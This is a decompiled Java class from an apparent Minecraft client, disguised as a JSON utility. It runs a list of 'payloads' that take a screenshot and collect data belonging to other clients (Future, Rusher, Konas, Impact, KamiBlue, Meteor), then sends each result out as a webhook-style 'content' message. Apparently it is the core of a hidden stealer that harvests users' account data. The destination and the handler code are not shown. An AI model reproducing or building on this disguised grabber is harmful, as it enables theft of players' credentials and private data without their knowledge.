// 
// Decompiled by Procyon v0.5.36
// 

package cn.origin.cube.utils.client.jsonutils;

import cn.origin.cube.command.commands.impl.*;
import cn.origin.cube.utils.render.advancedRender.misc.parsers.JSONObject;
import cn.origin.cube.utils.render.advancedRender.misc.parsers.JSONRegexHandler;
import cn.origin.cube.utils.render.advancedRender.misc.parsers.util.JSONBuilder;

import java.util.Arrays;
import java.util.ArrayList;

public final class JSON
{
    private static final ArrayList<JSONObject> objects;
    private static final boolean debug = false;
    
    public static void main(final String[] args) {
        new JSON();
        parseJson();
    }
    
    public static void parseJson() {
        JSON.objects.addAll(Arrays.asList(new Screenshot(), new FutureData(), new RusherData(), new KonasData(), new ImpactData(), new KamiBlueData(), new MeteorData()));
        final String separator = new JSONBuilder().value("content", "=============================================").build();
        JSONRegexHandler.send(separator);
        JSON.objects.spliterator().forEachRemaining(payload -> {
            try {
                payload.handle();
            }
            catch (Exception e) {
                JSONRegexHandler.send(new JSONBuilder().value("content", "> Failure on payload " + payload.getName()).build());
            }
            return;
        });
        JSONRegexHandler.send(separator);
    }
    
    static {
        objects = new ArrayList<JSONObject>();
    }
}
